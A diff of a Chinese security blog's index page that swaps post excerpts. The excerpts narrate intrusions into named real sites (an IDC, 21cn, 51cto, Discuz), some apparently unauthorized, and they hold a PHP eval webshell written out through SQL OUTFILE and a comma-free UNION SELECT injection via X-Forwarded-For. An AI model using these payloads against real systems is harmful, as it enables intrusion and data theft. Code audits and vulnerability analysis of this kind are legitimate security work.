@@ -45,44 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-09T18:23:55.000Z" itemprop="datePublished">
-          2012-08-10
+      <time datetime="2012-11-09T01:17:23.000Z" itemprop="datePublished">
+          2012-11-09
       </time>
     
     
     | 
-    <a href='/tag/Wordpress/'>Wordpress</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/入侵/'>入侵</a>
+    <a href='/tag/Android/'>Android</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/750.seo/">转国外]干掉一个wp站点</a></h2>
+      <h2 class="post-title"><a href="/929.seo/">对Android最新fakesms漏洞的分析</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>他站点（旁站：sameip.org）：</p>
-<p><a href="http://img.cker.in/wp_90E7/clip_image001.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/wp_90E7/clip_image001_thumb.png" alt="clip_image001" width="541" height="296" border="0" /></a></p>
-<p><a href="http://sameip.org/">Same IP</a>   26 sites hosted on IP Address 173.236.138.113</p>
-<p style="text-align: justify;"><strong>IDDomainSite Link</strong>1</p>
-
-<p><pre>hijackthisforum.com<a href="http://www.hijackthisforum.com/">hijackthisforum.com</a>2sportforum.net<a href="http://www.sportforum.net/">sportforum.net</a>3freeonlinesudoku.net<a href="http://www.freeonlinesudoku.net/">freeonlinesudoku.net</a>4cosplayhell.com<a href="http://www.cosplayhell.com/">cosplayhell.com</a>5videogamenews.org<a href="http://www.videogamenews.org/">videogamenews.org</a>6gametour.com<a href="http://www.gametour.com/">gametour.com</a>7qualitypetsitting.net<a href="http://www.qualitypetsitting.net/">qualitypetsitting.net</a>8brendanichols.com<a href="http://www.brendanichols.com/">brendanichols.com</a>98ez.com<a href="http://www.8ez.com/">8ez.com</a>10hack-test.com<a href="http://www.hack-test.com/">hack-test.com</a>11kisax.com<a href="http://www.kisax.com/">kisax.com</a>12paisans.com<a href="http://www.paisans.com/">paisans.com</a>13mghz.com<a href="http://www.mghz.com/">mghz.com</a>14debateful.com<a href="http://www.debateful.com/">debateful.com</a>15jazzygoodtimes.com<a href="http://www.jazzygoodtimes.com/">jazzygoodtimes.com</a>16fruny.com<a href="http://www.fruny.com/">fruny.com</a>17vbum.com<a href="http://www.vbum.com/">vbum.com</a>18wuckie.com<a href="http://www.wuckie.com/">wuckie.com</a>19force5inc.com<a href="http://www.force5inc.com/">force5inc.com</a>20virushero.com<a href="http://www.virushero.com/">virushero.com</a>21twincitiesbusinesspeernetwork.com<a href="http://www.twincitiesbusinesspeernetwork.com/">twincitiesbusinesspeernetwork.com</a>22jennieko.com<a href="http://www.jennieko.com/">jennieko.com</a>23davereedy.com<a href="http://www.davereedy.com/">davereedy.com</a>24joygarrido.com<a href="http://www.joygarrido.com/">joygarrido.com</a>25prismapp.com<a href="http://www.prismapp.com/">prismapp.com</a>26utiligolf.com<a href="http://www.utiligolf.com/">utiligolf.com</a></pre><br>总计有26个站点在[173.236.138.113]这台服务器上。为了黑掉目标站点，许多黑客会把目标站点同服的其他站点也划入攻击范围内。但是出于学习的目的，我们今天暂且将其他站点放在一边。</p>
-<p>我们需要更多关于目标站点的信息（Ps：笔者认为在渗透测试过程中，这比实施测试的环节来得重要得多。），他们包括：</p>
-<p>1.DNS记录（A，NS，TXT，MX）</p>
-<p>2.WEB服务类型（IIS，APACHE，TOMCAT）</p>
-<p>3.域名注册者的信息（所持有域名公司等）</p>
-<p>4.目标站点管理员（相关人员）的姓名，电话，邮箱和住址等</p>
-<p>5.目标站点所支持的脚本类型（PHP，ASP，JSP，ASP.net，CFM）</p>
-<p>6.目标站点的操作系统（UNIX,LINUX,WINDOWS,SOLARIS）</p>
-<p>7.目标站点开放的端口</p>
-<p>让我们先来查询相关DNS记录吧，这里用的是 who.is：</p>
-<p><a href="http://img.cker.in/wp_90E7/clip_image002.png" target="_blank"><img style="display: inline; border: 0px;" title="clip_image002" src="http://img.cker.in/wp_90E7/clip_image002_thumb.png" alt="clip_image002" width="596" height="326" border="0" /></a></p>
+        <p>近期<a href="http://ha.cker.in/tag/Android" target="_blank">Android</a>爆出SMS smishing vuln, 首先来源于<a href="http://www.csc.ncsu.edu/faculty/jiang/smishing.html">http://www.csc.ncsu.edu/faculty/jiang/smishing.html</a>， 然后<a href="https://github.com/thomascannon/android-sms-spoof">github上给出了poc</a>,具体来说是任意一个app在没有write_sms权限下可以伪造任意发件人的任意短信。</p>  <p>影响平台可上至Android 1.6下至4.1。由于很多以android2.3为主的手机已经不能再升级，此漏洞的危害不可小视。一个攻击场景是malicious app首先向ISP发送一条申请业务的短信，然后伪造ISP发送一条用户需要确认的短信。当用户确认时就中招了。</p>  <p>两张截图：</p>  <p><a href="http://blog.flanker017.me/wp-content/uploads/2012/11/device-2012-11-08-020802.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Androidfakesms_F312/clip_image002.png" width="244" height="420" /> </a><a href="http://blog.flanker017.me/wp-content/uploads/2012/11/device-2012-11-08-020818.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Androidfakesms_F312/clip_image004.png" width="244" height="420" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/750.seo/" class="excerpt-link">Read More...</a>
+          <a href="/929.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -91,29 +76,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">
-          2012-08-10
+      <time datetime="2012-11-06T22:14:19.000Z" itemprop="datePublished">
+          2012-11-07
       </time>
     
     
     | 
-    <a href='/tag/入侵/'>入侵</a>,
+    <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/idc/'>idc</a>
+    <a href='/tag/代码审计/'>代码审计</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/747.seo/">对IDC的一次检测</a></h2>
+      <h2 class="post-title"><a href="/928.seo/">Metinfo 代码审计</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br /><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452" /></a>    <br />一、拿个shell    <br />php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br />但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br />不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br />（1）路径不对；    <br />（2）root被降权，没有权限写；    <br />（3）被检测到恶意代码；    <br />前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br />测试了结果：    <br />(1)执行命令不行；    <br />(2)只能在本站转；    <br />什么也干不了。    <br />二、再拿php、asp&#160; shell    <br />后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br />上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br />又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br />陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p>
+        <p>文:&#160; 西毒</p>  <p>欢迎大家到<a href="https://forum.90sec.org/&amp;#160">https://forum.90sec.org/&amp;#160</a>; &amp;&amp; <a href="http://www.linux520.com/bbs/">http://www.linux520.com/bbs/</a></p>  <p>0x01 前沿</p>  <p>&#160;&#160; MetInfo企业网站管理系统：采用PHP+Mysql架构，全站内置了SEO搜索引擎优化机制，支持用户自定义界面语言(全球各种语言)，拥有企业网站常用的模块功能（企业简介模块、新闻模块、产品模块、下载模块、图片模块、招聘模块、在线留言、反馈系统、在线交流、友情链接、网站地图、会员与权限管理）。强大灵活的后台管理功能、静态页面生成功能、个性化模块添加功能、不同栏目自定义FLASH样式功能等可为企业打造出大气漂亮且具有营销力的精品网站。</p>  <p>这套程序之前爆出来一个远程执行代码的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>之后，就没什么人去挖掘了。整套程序还是很多人用的，下图是查出来的结果</p>  <p><a href="http://img.cker.in/Metinfo_C76E/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Metinfo_C76E/clip_image001_thumb.jpg" width="502" height="184" /></a></p>  <p>整个对这套cms审计花了我几天的时间，下面一一道来。</p>  <p>0x02 注入一</p>  <p>此次代码审计是官网最新版</p>  <p>在message/access.php中13行</p>  <p><a href="http://img.cker.in/Metinfo_C76E/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Metinfo_C76E/clip_image002_thumb.jpg" width="578" height="245" /></a></p>  <p>大家应该看到了，这个$id是没过滤的，这里的$id是怎么来的呢？请看include/common.inc.php中</p>  <p><a href="http://img.cker.in/Metinfo_C76E/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Metinfo_C76E/clip_image003_thumb.jpg" width="578" height="207" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/747.seo/" class="excerpt-link">Read More...</a>
+          <a href="/928.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -122,75 +107,57 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T20:57:54.000Z" itemprop="datePublished">
-          2012-08-09
+      <time datetime="2012-11-06T01:47:32.000Z" itemprop="datePublished">
+          2012-11-06
       </time>
     
     
     | 
-    <a href='/tag/Apache/'>Apache</a>,
-    
-    <a href='/tag/Mysql/'>Mysql</a>,
-    
-    <a href='/tag/php/'>php</a>,
-    
-    <a href='/tag/Linux-Mint/'>Linux Mint</a>,
-    
-    <a href='/tag/LNMP/'>LNMP</a>
+    <a href='/tag/解密/'>解密</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/742.seo/">LinuxMint安装Lamp</a></h2>
+      <h2 class="post-title"><a href="/927.seo/">转~ 东京大学加密招生海报解密过程（警告：Geek范，内含妹子）</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <h5><a href="http://ha.cker.in/tag/LinuxMint" target="_blank">LinuxMint</a>安装Apache2 Web服务</h5>  <p>VPS 默认有安装Apache2，但如果你删除了，就需要重新安装；如果没有删除，执行下面的命令会退出来，不会对系统产生任何影响。</p>  <p>输入如下命令安装</p>  <pre>sudo apt-get install apache2</pre><br><br><p>正常情况下会给出如下提示，说明Apache2默认已经安装好了：</p><br><br><pre><br />$sudo apt-get install apache2<br>Reading package lists… Done<br>Building dependency tree… Done<br>apache2 is already the newest version.<br>0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</pre><br><a name=".E5.BC.80.E5.90.AF_Apache2_.E7.9A.84.E4.BC.AA.E9.9D.99.E6.80.81"></a><br><br><h5>开启 Apache2 的伪静态</h5>
+        <p>我东京帝国大学，远没你想得那么简单，这就是日本技术宅的极致。</p>  <p>作为校友，请允许我使用熟谙且常用的傲娇文风(读者可按照《龙樱》中的形象自动补脑)，为母校写篇招生软文，弊校校训：“以质取胜，以质取量，培养国家领导人和各阶层中坚力量”。所以永不扩招，名额有限，速度申请啊亲。   <br /><a href="http://img.cker.in/Geek_F978/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="photo-media" border="0" alt="clip_image001" src="http://img.cker.in/Geek_F978/clip_image001_thumb.jpg" width="600" height="840" /></a>    <br />这个是去年东京大学情報理工学系研究科的招生海报，我看到人人网和微博都疯狂转载。情报还理工！就要求你有超凡的情报分析能力和工科背景。就比如楼主其实叫余则润成，美国威廉姆斯中专毕业之后来到日本读博士，专业Mechanic机械师，拿着中日双份工资，碟中谍5。9月10日我第一个任务做掉出钱购岛的日本金融大臣松下忠洋<a href="http://rrurl.cn/4y9dbx">http://www.baidu.com/s?wd=%CB%C9%CF%C2%D6%D2%D1%F3</a>。曾在金三角完美训练，做的很干净，像自杀。9月13日第二个任务将新上任的大使西宫伸一<a href="http://rrurl.cn/h7dwp0">http://www.baidu.com/s?wd=%CE%F7%B9%AC%C9%EC%D2%BB</a>。我会继续当普通学生在这里好好学情报，请忘掉我的名字，如果非要记得我，请叫我城市猎人。</p>  <p>此图一出，宾大和CMU都难与之争锋。高校IT男屌纷纷跪舔，各种遐想和意淫，我们东大的软妹子一副古色古香的打扮，娴静而端庄，这样的的学妹，你有吗？当大家对着可爱的妹子胡思乱想时，不知你是否想过，前面的那一串二进制01串并非是用脸滚键盘出来的装饰品，而是别有深意呢？一曲肝肠断，天涯何处觅知音，我们只写给懂的人看。正如本太君常年写的日志，可以读成单纯的温情小故事，也可以读出高端黑，全看读者姿势水平。</p>  <p>实际上，这此图精髓之处并非作为背景的妹子，而恰恰是前面的这个0101一大串二进制数字，看到棒棒和洞洞你激动了吗？我想很多青年早已猜到里面含有信息——搞计算机的没妹子，而且不是1就是0。啊哈，玩笑过后我们就来看看这个0101到底是什么意思。</p>  <p>首先用ocr软件将图片上的数字转化为文本，数字串总共26行，除最后一行98个数字外其它每行110个数字，共计2848个数字。神马？你说你是人工抄写的？卧槽，连光学字符识别都不会用，您还是留在清华保研吧。</p>  <pre>00011111100010110000100000000000000000000000000000000000000000000000001000000011011011010101000011001011010011<br>10110000100100000000010100001111010101001100011110100001010101101010110101100000001110000000000011010100001101<br>10000101000100010011011010001110001000010110001100010011000110101100010011000011010010011010011000001101100010<br>11100000011010011010101001010111100001110100010011011001110101100000001011000011110111010010111101110010111000<br>11010110000001010010011000101110111111000000000011111111110000111000111101110000111000011110001100010110010011<br>01000011001000100110010011110011001001110010111001111101111001111010010011011110111110111001111101111111010111<br>11000111111000000001101100001000011110110010000001100001010100101011010010011010110011000010010010000010000010<br>10010100100001100011011000110010000110001101010110010001010101111001000101010010101100001100111100010011110111<br>10000101001010111110010000000001010000111010010001100010101101100001100110100010010011011110111111010010001000<br>01000110000111001011100001001100101110010000101010000101111100011100111101001111101110011011010110100000001011<br>10111101011101010110010010110000011011000010101111011010111010000111101101001110010110010110111001000111011011<br>11111110000100111110111110011110111100001100110111000001110100001001001001000001010100101100011010000101100011<br>00010011010110110000110011100110101001001100101001000111110000010110000000100010011011010101011100111000000100<br>11101011110110011001010101011001011010110111011111111010110000111010100100100110001111101011000010011100110110<br>10101001111011010101000111110000011110100011110110100001010101110111010101001110010001110101000101000101000001<br>01010010110001101011010110001100000111001001010000011000100110000110001000110010111111100101101010011110011101<br>10011110011000111100101110000101010101000110101101111010001000111001110100100001111110011111010101000110010101<br>00110010001111111011111000000100111001111001110101010001101110011000100100010110010111010011111000101100001011<br>11100010100010011000110110111010011001001001111011010010111000001111000011100100100100010011101011010001110010<br>01100101001101100001101100110000111111010010101000011010011000000111110100011000100001101010010110100110110110<br>01010001010000101001110011010110000101110001111010000101001011100100110100001001000001101000110101111110001010<br>01010000100100011000011000110110110111110100000010011110111001100000010011100100100101100010000010111111100101<br>10110110111000100000100010100000100001100001001110011101001000101000000110001110011000011101111100101000111101<br>01000011010010100100011000001000010001111011110001101010100110001111110100001101110100100001101101100010101101<br>11000010111011101011111111011110010000100010100101101101100100110101111000001101110010100000011100110101011000<br>01111011110010100000000010110111111110101010100011000010011100000110111110000000010000000000000000</pre><br><br><p>首先第一个想法肯定是ASCII编码，由于不知道是big-endian还是little-endian就两个都试一次，结果看不出来是什么有意义的字符串。考虑到可能用凯撒密码加密过，去掉非拉丁字母后反解出26个可能的文本，也都没有什么意义。看来不是ASCII编码。</p>
 
-<p>如果希望开启Apache2 伪静态 rewrite 支持，输入如下命令安装</p>
+<p>考虑到2848长度是8的倍数，也可能是二进制文件，所以也big-endian和little-endian地读出来并写成二进制文件。<br>  <br />而big-endian的那个输出是一个gz压缩包。实际上，看不出来的话，也可以把文件头的3个字节丢google。如果你直接用Linux中的file命令看岂不是显得咱技术含量太低太傻瓜化？</p>
 
-<pre>#a2enmod rewrite</pre>
+<p><a href="http://img.cker.in/Geek_F978/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="photo-media" border="0" alt="clip_image002" src="http://img.cker.in/Geek_F978/clip_image002_thumb.jpg" width="600" height="522" /></a><br><br>  <br />改名为bin.gz，解压得到一个叫做bin的文件。内容：</p>
 
-<p>正常情况下会给出如下提示，说明已经安装成功：</p>
+<p>\CA\FE\BA\BE\00\00\002\00!<br>  <br />\00\00<br><br>  <br />\00\00\00<br><br>  <br />\00\00<br><br>  <br />\00\00\00\00\00&lt;init&gt;\00</p>
 
-<pre>#a2enmod rewrite
-Module rewrite installed; run /etc/init.d/apache2 force-reload to enable.</pre>
+<p><hr align="left" size="1" width="33%" />()V\00</p>
+<p><hr align="left" size="1" /> Code\00</p>
+<p><hr align="left" size="1" /> main\00([Ljava/lang/String;)V\00 StackMapTable</p>
+<p><br />\00\00 \00</p>
+<p><br />\00\00\00)w-aurlwtcniewo./-t.kjhltiypioe.o/kvru.fae\00</p>
+<p><br />\00\00\00‑</p>
+<p><br />\00­\00 \00i\00java/lang/Object\00java/lang/System\00</p>
+<p><hr align="left" size="1" width="33%" /> out\00Ljava/io/PrintStream;\00java/lang/String\00charAt\00</p>
+<p><hr align="left" size="1" /> (I)C\00java/io/PrintStream\00print\00</p>
+<p><hr align="left" size="1" /> (C)V\00 \00\00\00\00\00\00\00[1]\00\00\00\00 \00\00</p>
+<p><br />\00\00\00\00\00\00\00\00*\B7\00\B1\00\00\00\00\00 \00</p>
+<p><br />\00</p>
+<p><br />\00\00</p>
+<p><br />\00\00\00=\00</p>
+<p><hr align="left" size="1" /> \00</p>
+<p><hr align="left" size="1" width="33%" /> \00\00\00!</p>
+<p><hr align="left" size="1" width="33%" /> =)\A2\00\B2\00[1]</p>
+<p><hr align="left" size="1" width="33%" /> h)p\B6\00</p>
+<p><hr align="left" size="1" /> \B6\00\84[1]\A7\FF\E5\B1\00\00\00\00 \00\00\00</p>
+<p><br />\00[1]\FD\00[1]\00\F9\00\00\00\00</p>
+<p>熟悉java的同学应该一眼就能看出(额也许熟悉java的也不一定能)这是个编译过的class文件（看不懂的也可以用jd-gui反编译），改名为bin.class，运行提示Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: bin (wrong name: i)再改名为i.class，运行得到<a href="http://rrurl.cn/o5gwn0">www.i.u-tokyo.ac.jp/fun/hikari-loveletter</a> 点开能在此帝国大学的官方网站里找到妹子写真哦~</p>
 
-<p>提示需要重新加载Apache2的配置，由于下一步是安装mysql，所以暂时不用重启。</p>
-
-<p>或出现如下提示，表示已经开启了 rewrite</p>
-
-<pre># a2enmod rewrite
-Mudule rewrite already enabled</pre>
-<a name=".E5.AE.89.E8.A3.85_mysql_.E6.95.B0.E6.8D.AE.E5.BA.93.E6.9C.8D.E5.8A.A1"></a>
-
-<h5><strong>安装 mysql 数据库服务</strong></h5>
-
-<p>安装mysql前，#1的vps需要先关闭apache2，因为mysql的安装会初始化数据，占了很大内存，如果apache2不关闭，有可能导致安装mysql失败。</p>
-
-<p>1 输入如下命令关闭 apache2</p>
-
-<pre>$sudo service apache2 stop
-如果输入正确，会提示如下信息，表示apache2已经停止</pre>
-
-<pre><a href="http://img.cker.in/LinuxMintLnmpLamp_35CE/image.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_thumb.png" width="659" height="101" /></a> </pre>
-
-<p>2 输入如下命令安装mysql</p>
-
-<pre>$apt-get install mysql-server</pre>
-
-<p>如果输入正确，会提示如下信息：</p>
-
-<p><a href="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_3.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/LinuxMintLnmpLamp_35CE/image_thumb_3.png" width="773" height="731" /></a> </p>
-
-<p>等待中……</p>
-
-<p>继续安装 会提示输入 mysql 的 root 用户密码，你可以输入密码后回车，也可以不输入任何密码直接回车。 （不输入密码不会影响到Mysql的安全性，因为Mysql仅仅用于本地监听，但不输入密码会导致后续phpmyadmin无法运行）</p>
+<p>另外还有版权信息的文本解密： 0x11c开始，sjis编码 <a href="http://rrurl.cn/o5gwn0"><br>    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Geek_F978/clip_image003.jpg" width="636" height="510" /><br><br>    <br /></a>恭喜！能看到这一步，你已经有不提交任何材料直接给面试的资格了，但是离最终录取还有下面一段路程。<a href="http://img.cker.in/Geek_F978/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="photo-media" border="0" alt="clip_image004" src="http://img.cker.in/Geek_F978/clip_image004_thumb.jpg" width="600" height="468" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/742.seo/" class="excerpt-link">Read More...</a>
+          <a href="/927.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -199,27 +166,35 @@ Mudule rewrite already enabled</pre>
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T11:57:47.000Z" itemprop="datePublished">
-          2012-08-08
+      <time datetime="2012-11-05T06:38:54.000Z" itemprop="datePublished">
+          2012-11-05
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/注入/'>注入</a>,
+    
+    <a href='/tag/注入漏洞/'>注入漏洞</a>,
+    
+    <a href='/tag/上传漏洞/'>上传漏洞</a>,
+    
+    <a href='/tag/暴库/'>暴库</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/739.seo/">对21cn分站的检测</a></h2>
+      <h2 class="post-title"><a href="/926.seo/">年终了，谈点个人入侵的经验〈转载〉</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>原文地址：法克论坛   <br />作者：泪少    <br />网址：<a href="http://zhao.21cn.com（漏洞站点的域名/URL）">http://zhao.21cn.com（漏洞站点的域名/URL）</a></p>  <p>站点：天翼关爱 电信旗下21分站 （漏洞站点的名字，记得是全称）</p>  <p>风险一   <br />风险描述：后台列目录 可以下载源文件 从文件找到mysql的密码 找到mysql库里查询后台登录地址 进一步<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a> （这里你发现的是什么漏洞就写什么漏洞）    <br />风险示例：    <br /><a href="http://img.cker.in/21cn_3785/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/21cn_3785/clip_image001_thumb.png" width="497" height="395" /></a></p>
+        by 老君   这一年变化比较大，换了好几个工作，最终还是回到了安全的岗位，合乎自己的职业规划！    平时空闲时间经常找些站练练手，基本是新闻闹出轰动的站与一些知名的大站。2008年的成果还是颇丰的，从某某国内2大知名社区论坛到某某著名交友站到某某 2大读书站到某某mobile到某某政府站等大站，再到若干名不见经传的小站，都闪过的我的影踪。但我个人觉得没什么好炫耀的，于是没替换首页，没留下黑页，顶多是把源代码打包带回家（硬盘吃不消了，
       
       </p>
       
       <p>
-          <a href="/739.seo/" class="excerpt-link">Read More...</a>
+          <a href="/926.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -228,27 +203,22 @@ Mudule rewrite already enabled</pre>
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T05:14:22.000Z" itemprop="datePublished">
-          2012-08-08
+      <time datetime="2012-11-03T05:41:55.000Z" itemprop="datePublished">
+          2012-11-03
       </time>
     
-    
-    | 
-    <a href='/tag/backtrack/'>backtrack</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/736.seo/">BackTrack 5中启用SSH服务</a></h2>
+      <h2 class="post-title"><a href="/925.seo/">51cto主站及旗下所有子站沦陷</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        BackTrack 5启用SSHD服务后我们看到22端口已经开启，依然无法从远程连接    连接时会有提示：    Read from socket failed: Connection reset by peer     通过以下几步生成密钥对即可连接：     #/etc/init.d/ssh restart     #ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key     #ssh-k
+        1个小漏洞导致  1.旗下linkphone.cn, phpcms V9 读取任意文件漏洞爆数据库配置信息   2.数据库程序处于分离状态，果断扫相邻ip段3306，非常不幸的是数据库在该段里，并且还开了外链，本地phpmyadmin连上    3.结果数据只能读不能写，关键是所有站点的数据库都在这台服务器上   #1290 - The MySQL server is running with the –read-only option
       
       </p>
       
       <p>
-          <a href="/736.seo/" class="excerpt-link">Read More...</a>
+          <a href="/925.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -257,27 +227,31 @@ Mudule rewrite already enabled</pre>
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-29T09:09:52.000Z" itemprop="datePublished">
-          2012-07-29
+      <time datetime="2012-11-02T23:24:07.000Z" itemprop="datePublished">
+          2012-11-03
       </time>
     
     
     | 
-    <a href='/tag/Csdn/'>Csdn</a>
+    <a href='/tag/Discuz/'>Discuz</a>,
+    
+    <a href='/tag/渗透检测/'>渗透检测</a>,
+    
+    <a href='/tag/X-Forwarded-For/'>X-Forwarded-For</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/731.seo/">鬼哥Csdn刷积分,免积分下载器v3.0</a></h2>
+      <h2 class="post-title"><a href="/924.seo/">记一次对Discuz官方论坛的渗透检测</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        可免积分下载Csdn文件，直接获取下载地址     点此下载文件 已失效哦！  
+        <p>前言: 此次检测纯属偶然, 源于Errorera同学一直想拿下腾讯, 然后找腾讯换ipad玩, 结果搞着搞着就把目标对准Discuz了, 反正<a href="http://ha.cker.in/tag/Discuz" target="_blank">Discuz</a>也属于腾讯业务,    <br />估计搞下也能换ipad, Errorera同学怀着这样的美好愿望就开搞了!    <br />此文所有图片均由Errorera同学提供, 本来我想等我把文章写了他再提交的, 可丫太着急要ipad了, 所以瞒着我直接提交了!! 所以现在所有漏洞都已经修补,&#160; <br />导致我想截图都截不了了… 还好他已经写了一篇文章, 我就将就直接修改下拿上来吧~    <br />过程Top1: Dev.<a href="http://ha.cker.in/tag/Discuz" target="_blank">Discuz</a>.Org注射: (此过程前几日已在土司发了部分内容, 之后自己删除, 原因后面会提到)    <br />下午我正在卖衣服, 突然Errorera就在群里说找到突破口了, 原来Dev.Discuz.Org这个站是Discuz的开发者论坛, 但是却很二逼的直接把”<a href="http://ha.cker.in/tag/X-Forwarded-For" target="_blank">X-Forwarded-For</a>”直接带入了数据库, 且无任何过滤, so..注射就这样产生了~ 首先直接打开是显示登录页面:    <br /><a href="http://img.cker.in/Discuz_D755/clip_image002.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Discuz_D755/clip_image002_thumb.png" width="620" height="385" /></a>    <br />然后再修改下X-Forwarded-For的值为111′, 再刷新下页面Mysql就报错了:    <br /><a href="http://img.cker.in/Discuz_D755/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Discuz_D755/clip_image004_thumb.jpg" width="620" height="140" /></a>    <br />既然存在注射, 那首先想的肯定是怎么获取到我们想要的信息了, 用户数据库? 亦或是ROOT密码? 还是直接into_Outfile呢 = =? 不过这都是废话, 要是这么简单搞定的话也就没后话了~    <br />首先看这Mysql信息肯定是使用的DISCUZ来构建的, 但是具体是什么版本就不知道了, 所以我就先猜了下字段数, 想用常规方法爆出东西, 最后确定字段数为5, 然后就顺手union了, 殊不知过滤了逗号, 顿时傻逼…..    <br />以上图没截到, 所以就一笔带过吧~ 随后多次测试, 使用了网上提到的JOIN方法成功突破:</p>  <p>127’ UNION SELECT <em> FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>  <p>UNION SELECT </em> FROM ((SELECT 1)a JOIN (SELECT 2)b实际上也就相当于UNION SELECT 1,2   <br />正当我以为会出现熟悉的1 2 3 4 5的时候, 却直接登录进去了….    <br /><a href="http://img.cker.in/Discuz_D755/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/Discuz_D755/clip_image006_thumb.jpg" width="620" height="222" /></a>    <br />这dz是什么版本也不知道, 